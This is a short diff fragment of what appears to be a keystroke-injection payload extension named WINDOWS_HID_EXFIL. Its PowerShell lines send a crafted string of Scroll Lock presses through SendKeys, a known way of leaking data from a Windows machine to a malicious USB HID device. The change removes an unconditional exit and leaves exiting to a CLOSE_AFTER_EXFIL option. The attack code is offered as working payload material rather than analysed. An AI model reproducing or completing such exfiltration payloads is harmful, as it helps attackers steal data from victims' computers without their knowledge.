@@ -51,7 +51,6 @@ EXTENSION WINDOWS_HID_EXFIL
             $o+="%{SCROLLLOCK}";
             Add-Type -Assembly System.Windows.Forms;
             [System.Windows.Forms.SendKeys]::SendWait("$o");
-            exit;
         END_STRING
         IF_DEFINED_TRUE #CLOSE_AFTER_EXFIL
             STRING exit;
